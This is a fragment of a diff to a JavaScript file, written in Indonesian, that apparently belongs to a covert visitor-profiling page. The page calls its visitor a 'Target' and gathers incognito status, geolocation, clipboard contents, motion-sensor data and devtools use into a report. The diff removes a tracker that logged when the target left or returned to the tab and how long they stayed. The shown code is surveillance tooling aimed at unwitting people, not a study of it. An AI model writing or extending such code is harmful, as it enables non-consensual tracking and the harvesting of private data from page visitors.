@@ -617,26 +617,6 @@ const deteksiIncognito = async () => {
   return `౼ 〘 𝗠𝗢𝗗𝗘 𝗣𝗥𝗜𝗩𝗔𝗦𝗜 〙 ౼\nMode Incognito: ${incognito ? "Mungkin aktif" : "Tidak terdeteksi"}`;
 };
 
-let tabActivityInfo = "";
-document.addEventListener("visibilitychange", () => {
-  const waktu = new Date().toLocaleTimeString();
-  if (document.hidden) {
-    tabActivityInfo += `📤 ${waktu} : Target keluar dari halaman.\n`;
-  } else {
-    tabActivityInfo += `📥 ${waktu} : Target kembali ke halaman.\n`;
-  }
-});
-
-const ambilAktivitasTab = () => {
-  return `౼ 〘 𝗔𝗞𝗧𝗜𝗙𝗜𝗧𝗔𝗦 𝗧𝗔𝗕 〙 ౼\n${tabActivityInfo || "Belum ada aktivitas tab."}`;
-};
-
-const waktuMulai = Date.now();
-const ambilDurasiHalaman = () => {
-  const detik = Math.floor((Date.now() - waktuMulai) / 1000);
-  return `౼ 〘 𝗪𝗔𝗞𝗧𝗨 𝗧𝗜𝗡𝗚𝗚𝗔𝗟 〙 ౼\nTotal: ${detik} detik`;
-};
-
 const ambilLokasi = () => {
   return new Promise((resolve) => {
     if (!navigator.geolocation) {
@@ -816,7 +796,6 @@ const mulai = async () => {
     sensorGerakan,
     clipboardInfo,
     incognitoInfo,
-    aktivitasTab,
     devtoolsInfo,
     lamaDiHalaman
   ].join("\n\n");
